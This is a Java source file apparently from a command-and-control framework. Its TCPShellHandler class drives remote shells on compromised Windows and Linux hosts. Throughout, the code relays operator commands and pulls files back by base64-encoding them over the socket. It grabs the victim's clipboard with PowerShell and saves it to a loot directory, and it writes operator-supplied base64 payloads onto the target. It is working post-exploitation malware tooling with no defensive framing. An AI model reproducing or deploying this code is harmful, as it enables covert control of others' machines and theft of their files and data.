package c2.tcp;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Date;
import java.util.List;

import c2.Constants;
import c2.http.HTTPSManager;
import c2.session.IOManager;
import c2.tcp.GenericTCPInitiator.OS;
import util.Time;

public class TCPShellHandler implements Runnable {

	private OS myOS;
	private IOManager ioManager;
	private Socket socket;
	private int sessionId;
	private boolean stayAlive = true;
	private String hostname;
	private String username;
	private String lz;

	private SocketReader lsr = null;

	public static String CAT_CMD = "cat ";
	public static String UPLINK_CMD = "uplink ";
	public static String DOWNLOAD_CMD = "<control> download ";

	public static String CANNOT_UPLINK_FILE_HEADER = "Cannot uplink file: ";

	public TCPShellHandler(IOManager ioManager, SocketReader reader, Socket socket, int sessionId, String hostname,
			String username, String lz, OS myOS) {
		this.ioManager = ioManager;
		this.socket = socket;
		this.sessionId = sessionId;
		this.hostname = hostname;
		this.username = username;
		this.lz = lz;
		this.myOS = myOS;
		this.lsr = reader;
	}

	public void stop() {
		stayAlive = false;
	}

	@Override
	public void run() {
		try {
			OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(socket.getOutputStream()));
			while (stayAlive) {
				String response = lsr.readUnknownLinesFromSocket();

				if (response.length() != 0) {
					ioManager.sendIO(sessionId, response);
				}

				String nextCommand = ioManager.pollCommand(sessionId);
				if (nextCommand != null) {
					if (myOS.equals(OS.WINDOWS)) {
						operateWindowsCommand(bw, nextCommand);
					} else if (myOS.equals(OS.LINUX)) {
						operateLinuxCommand(bw, nextCommand);
					}

					try {
						Thread.sleep(1000);
					} catch (InterruptedException e) {
					}
				}
				response = lsr.readUnknownLinesFromSocket();

				if (response.length() != 0) {
					ioManager.sendIO(sessionId, response);
				}
				Time.sleepWrapped(Constants.getConstants().getRepollForResponseInterval());

			}
		} catch (IOException e) {
			// Moving on
		} finally {
			try {
				socket.close();
			} catch (IOException e) {
				System.out.println("Can't close socket");
			}
		}

	}

	private void operateLinuxCommand(OutputStreamWriter bw, String nextCommand) throws IOException {
		// No need to translate pwd, this works as is
		if (nextCommand.equalsIgnoreCase("getUID")) {
			StringBuilder sb = new StringBuilder();
			sb.append("Username: " + username);
			sb.append(System.lineSeparator());
			String homedirCommand = "echo ~" + Constants.NEWLINE;
			bw.write(homedirCommand);
			bw.flush();
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
			}
			String response = lsr.readUnknownLinesFromSocket();
			String lines[] = response.split(Constants.NEWLINE);
			response = lines[0];

			// With a meterpreter Linux shell, the ~ character is not recognized. Check
			// The home dir for user. If it exists there, this is home. Otherwise,
			// home is unknown.
			if (response.equals("~")) {
				String listHomedirContent = "ls /home" + Constants.NEWLINE;
				bw.write(listHomedirContent);
				bw.flush();
				Time.sleepWrapped(1000);
				response = lsr.readUnknownLinesFromSocket();
				if (response.contains(username)) {
					response = "/home/" + username;
				} else {
					response = "Unknown";
				}
			}

			sb.append("Home Directory: " + response);
			sb.append(System.lineSeparator());
			sb.append("Hostname: " + hostname);
			sb.append(System.lineSeparator());
			sb.append(System.lineSeparator());
			ioManager.sendIO(sessionId, sb.toString());
		} else if (nextCommand.equalsIgnoreCase("die")) {
			bw.write("exit");
			bw.write(Constants.NEWLINE);
			bw.flush();
		} else if (nextCommand.startsWith(UPLINK_CMD)) {
			String targetFilename = nextCommand.substring(UPLINK_CMD.length());
			String mod = "base64 '" + targetFilename + "'";
			bw.write(mod);
			bw.write(Constants.NEWLINE);
			bw.flush();
			try {
				Thread.sleep(2500);
			} catch (InterruptedException e) {
			}
			String response = lsr.readUnknownLinesFromSocket();
			if (response.length() == 0 || response.contains("No such file or directory")) {
				ioManager.sendIO(sessionId, "Invalid uplink directive" + System.lineSeparator());
			} else {
				response = response.replace(Constants.NEWLINE, "");
				response = response + System.lineSeparator();
				String toClientMsg = "<control> uplinked " + targetFilename + " " + response;
				ioManager.sendIO(sessionId, toClientMsg);
			}
		}else if (nextCommand.startsWith("cd")) {
			bw.write(nextCommand);
			bw.write(Constants.NEWLINE);
			bw.write("pwd");
			bw.write(Constants.NEWLINE);
			bw.flush();
			Time.sleepWrapped(1000);
			String response = lsr.readUnknownLinesFromSocket();
			ioManager.sendIO(sessionId, response);
		} else if (nextCommand.startsWith(DOWNLOAD_CMD)) {
			String args[] = nextCommand.split(" ");
			if (args.length < 4) {
				ioManager.sendIO(sessionId, "Invalid download directive" + System.lineSeparator());
			} else {
				String filename = args[2];
				if (args.length != 4) {
					for (int idx = 3; idx < args.length - 1; idx++) {
						filename += " ";
						filename += args[idx];
					}
				}
				String downloadCommand = "echo \"" + args[args.length - 1] + "\" | base64 -d > '" + filename + "'";
				//System.out.println(downloadCommand);
				bw.write(downloadCommand);
				bw.write(Constants.NEWLINE);
				bw.flush();
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
				}
				String response = lsr.readUnknownLinesFromSocket();
				//System.out.println("-" + response + "-" );
				
				String mod = "base64 '" + filename + "'";
				bw.write(mod);
				bw.write(Constants.NEWLINE);
				bw.flush();
				try {
					Thread.sleep(2500);
				} catch (InterruptedException e) {
				}
				response = lsr.readUnknownLinesFromSocket();
				response = response.replace(Constants.NEWLINE, "");
				//System.out.println("-" + args[args.length - 1] + "-" );
				//System.out.println("-" + response + "-" );
				if(response.equals(args[args.length - 1])) {
					String toClientMsg = "File written: " + filename + System.lineSeparator();
					ioManager.sendIO(sessionId, toClientMsg);
				}else {
					ioManager.sendIO(sessionId, "Invalid download directive" + System.lineSeparator());
				}
				
			}
		} else if (nextCommand.startsWith(CAT_CMD)) {
			if (nextCommand.charAt(CAT_CMD.length()) == '>') {// Build and write to file
				processCatBuildWrite(nextCommand, bw, OS.LINUX);
			} else {
				// Read file
				// Append file to file
				// Overwrite file to file
				// Clean passthrough
				bw.write(nextCommand);
				bw.write(Constants.NEWLINE);
				bw.flush();
				Time.sleepWrapped(1000);
				if (nextCommand.contains(">>")) {
					ioManager.sendIO(sessionId, "Appended file" + System.lineSeparator());
				} else if (nextCommand.contains(">")) {
					ioManager.sendIO(sessionId, "File write executed" + System.lineSeparator());
				} else {
					// Throw a line break in b/c the read file might not have one
					String response = lsr.readUnknownLinesFromSocket();
					if (response.length() != 0) {
						ioManager.sendIO(sessionId, response + System.lineSeparator());
						ioManager.sendIO(sessionId, System.lineSeparator());
					}
				}
			}
		} else {
			bw.write(nextCommand);
			bw.write(Constants.NEWLINE);
			bw.flush();
		}
	}

	private static boolean isACatReadCmd(String cmd) {
		return !cmd.contains("<") && !cmd.contains(">");
	}

	private void operateWindowsCommand(OutputStreamWriter bw, String nextCommand) throws IOException {
		if (nextCommand.equalsIgnoreCase("getUID")) {
			StringBuilder sb = new StringBuilder();
			sb.append("Username: " + username);
			sb.append(System.lineSeparator());
			bw.write("echo %USERPROFILE%");
			bw.write(System.lineSeparator());
			bw.flush();
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
			}
			String response = lsr.readUnknownLinesFromSocket();

			String lines[] = response.split(System.lineSeparator());
			sb.append("Home Directory: " + lines[0]);
			sb.append(System.lineSeparator());
			sb.append("Hostname: " + hostname);
			sb.append(System.lineSeparator());
			sb.append(System.lineSeparator());
			ioManager.sendIO(sessionId, sb.toString());
		}else if (nextCommand.startsWith("cd")) {
			bw.write(nextCommand);		
			bw.write(System.lineSeparator());
			bw.flush();
			Time.sleepWrapped(500);
			String response = lsr.readUnknownLinesFromSocket();
			bw.write("echo %CD%");
			bw.write(System.lineSeparator());
			bw.flush();
			Time.sleepWrapped(500);
			response = lsr.readUnknownLinesFromSocket();
			String lines[] = response.split(System.lineSeparator());
			ioManager.sendIO(sessionId, lines[0].concat(System.lineSeparator()));
		} else if (nextCommand.equalsIgnoreCase("pwd")) {
			bw.write("echo %CD%");
			bw.write(System.lineSeparator());
			bw.flush();
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
			}
			String response = lsr.readUnknownLinesFromSocket();
			String lines[] = response.split(System.lineSeparator());
			ioManager.sendIO(sessionId, lines[0].concat(System.lineSeparator()));
		} else if (nextCommand.equalsIgnoreCase("ps")) {// TODO Test me!
			bw.write("tasklist");
			bw.write(System.lineSeparator());
			bw.flush();
		} else if (nextCommand.equalsIgnoreCase("clipboard")) {
			String clipCommand = "powershell -command \"Get-Clipboard\"";
			bw.write(clipCommand);
			// System.out.println(clipCommand);
			bw.write(System.lineSeparator());
			bw.flush();
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
			}
			// System.out.println("Reading...");
			String response = lsr.readUnknownLinesFromSocket();
			// System.out.println("res: " + response);

			String baseDir = lz + File.separator + hostname + username;
			Files.createDirectories(Paths.get(baseDir));
			String filename = "Clipboard" + HTTPSManager.ISO8601_WIN.format(new Date()) + ".txt";

			try (FileWriter stream = new FileWriter(baseDir + File.separator + filename)) {
				stream.write(response.toString());
			}
			// System.out.println("File written: " + baseDir + File.separator + filename);
			ioManager.sendIO(sessionId, "Clipboard captured" + System.lineSeparator());
		} else if (nextCommand.startsWith(UPLINK_CMD)) {
			String targetFilename = nextCommand.substring(UPLINK_CMD.length());
			String uplinkCommand = "powershell -c \"[Convert]::ToBase64String((Get-Content -Path '" + targetFilename
					+ "' -Encoding Byte))\"";
			// System.out.println(uplinkCommand);
			bw.write(uplinkCommand);
			bw.write(System.lineSeparator());
			bw.flush();
			try {
				Thread.sleep(2500);
			} catch (InterruptedException e) {
			}
			// System.out.println("Reading...");
			String response = lsr.readUnknownLinesFromSocket();
			// System.out.println("Read: " + response.length());
			String lines[] = response.split(System.lineSeparator());
			if (lines.length != 0 && !response.contains("Get-Content : Cannot find path")) {
				response = lines[0].concat(System.lineSeparator());
				String toClientMsg = "<control> uplinked " + targetFilename + " " + response;
				ioManager.sendIO(sessionId, toClientMsg);
			} else {
				ioManager.sendIO(sessionId, "Invalid uplink directive" + System.lineSeparator());
			}
		} else if (nextCommand.startsWith(DOWNLOAD_CMD)) {
			String args[] = nextCommand.split(" ");
			if (args.length < 4) {
				ioManager.sendIO(sessionId, "Invalid download directive" + System.lineSeparator());
			} else {
				String filename = args[2];
				if (args.length != 4) {
					for (int idx = 3; idx < args.length - 1; idx++) {
						filename += " ";
						filename += args[idx];
					}
				}
				String downloadCommand = "powershell -c \"[IO.File]::WriteAllBytes('" + filename
						+ "', [Convert]::FromBase64String('" + args[args.length - 1] + "'))\"";
				// System.out.println(downloadCommand);
				bw.write(downloadCommand);
				bw.write(System.lineSeparator());
				bw.flush();
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
				}
				String msg = lsr.readUnknownLinesFromSocket();
				if (msg.contains("Exception calling \"FromBase64String\"")) {
					String toClientMsg = "Invalid download directive" + System.lineSeparator();
					ioManager.sendIO(sessionId, toClientMsg);
				} else {
					String toClientMsg = "File written: " + filename + System.lineSeparator();
					ioManager.sendIO(sessionId, toClientMsg);
				}

			}
		} else if (nextCommand.startsWith(CAT_CMD)) {
			if (isACatReadCmd(nextCommand)) {// read file
				if (nextCommand.startsWith(CAT_CMD + "-n ")) {// TODO: Have mode for line numbers

				} else {
					bw.write("type \"" + nextCommand.substring(CAT_CMD.length()) + "\"");
					bw.write(System.lineSeparator());
					bw.flush();
				}
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
				}
				String response = lsr.readUnknownLinesFromSocket();
				ioManager.sendIO(sessionId, response);
			} else if (nextCommand.charAt(CAT_CMD.length()) == '>') {
				processCatBuildWrite(nextCommand, bw, OS.WINDOWS);
			} else {
				// Append file to file
				// Overwrite file to file
				// Simply replaces cat with type
				String modCommand = nextCommand.replace(CAT_CMD, "type ");
				bw.write(modCommand);
				bw.write(System.lineSeparator());
				bw.flush();
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
				}
				// Flush line feed from type command
				lsr.readUnknownLinesFromSocket();
				if (nextCommand.contains(">>")) { // >> for file append
					ioManager.sendIO(sessionId, "Appended file" + System.lineSeparator());
				} else { // When > for file write
					ioManager.sendIO(sessionId, "File write executed" + System.lineSeparator());
				}

			}
			// screenshot - Cannot current implement with command prompt or powershell w/out
			// disk top
		} else {
			bw.write(nextCommand);
			bw.write(System.lineSeparator());
			bw.flush();
		}
	}

	private void processCatBuildWrite(String nextCommand, OutputStreamWriter bw, OS target) throws IOException {
		String nextLine = ioManager.pollCommand(sessionId);
		boolean keepReadingInput = true;
		boolean writeToFile = false;
		// Use the string builder to make a unified string to dump into B64 for file
		// writes
		StringBuilder builder = new StringBuilder();
		// And a list of lines to iterate and Add-Content for append operations
		List<String> lines = new ArrayList<String>();
		while (keepReadingInput) {
			if (nextLine != null) {
				if (nextLine.equals("<done>")) {
					writeToFile = true;
					keepReadingInput = false;
				} else if (nextLine.equals("<cancel>")) {
					keepReadingInput = false;
				} else {
					builder.append(nextLine);
					lines.add(nextLine);
					if (target == OS.WINDOWS) {
						builder.append(System.lineSeparator());
					} else {
						builder.append(Constants.NEWLINE);
					}
				}
			} else {
				try {
					Thread.sleep(100);
					Thread.yield();
				} catch (InterruptedException e) {
				}
			}
			nextLine = ioManager.pollCommand(sessionId);
		}
		if (writeToFile) {
			boolean writeClean = true; // Assume clean write, detect if >>
			if (nextCommand.charAt(CAT_CMD.length()) == '>' && nextCommand.charAt(CAT_CMD.length() + 1) == '>') {
				writeClean = false;
			}
			byte[] encoded = Base64.getEncoder().encode(builder.toString().getBytes());
			String base64OfNewContent = new String(encoded, StandardCharsets.US_ASCII);

			if (writeClean) {// Write new file
				String filename = nextCommand.substring(CAT_CMD.length() + 1); // Cut off the command the first char for
																				// '>'
				if (target == OS.WINDOWS) {
					String downloadCommand = "powershell -c \"[IO.File]::WriteAllBytes('" + filename
							+ "', [Convert]::FromBase64String('" + base64OfNewContent + "'))\"";
					bw.write(downloadCommand);
					bw.write(System.lineSeparator());
				} else {
					String downloadCommand = "echo \"" + base64OfNewContent + "\" | base64 -d > " + filename;
					bw.write(downloadCommand);
					bw.write(Constants.NEWLINE);
					bw.flush();
				}
				bw.flush();
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
				}
				lsr.readUnknownLinesFromSocket();
				ioManager.sendIO(sessionId, "Data written" + System.lineSeparator());
			} else {// Append existing
				String filename = nextCommand.substring(CAT_CMD.length() + 2);
				for (String line : lines) {
					if (target == OS.WINDOWS) {
						String appendCommand = "powershell -c \"add-content " + filename + " '" + line + "' \"";
						bw.write(appendCommand);
						bw.write(System.lineSeparator());
					} else {
						String appendCommand = "echo \"" + line + "\" >> " + filename;
						bw.write(appendCommand);
						bw.write(Constants.NEWLINE);
					}
				}
				bw.flush();
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
				}
				lsr.readUnknownLinesFromSocket();
				ioManager.sendIO(sessionId, "Data written" + System.lineSeparator());
			}
		} else {
			ioManager.sendIO(sessionId, "Abort: No file write" + System.lineSeparator());
		}
	}
}
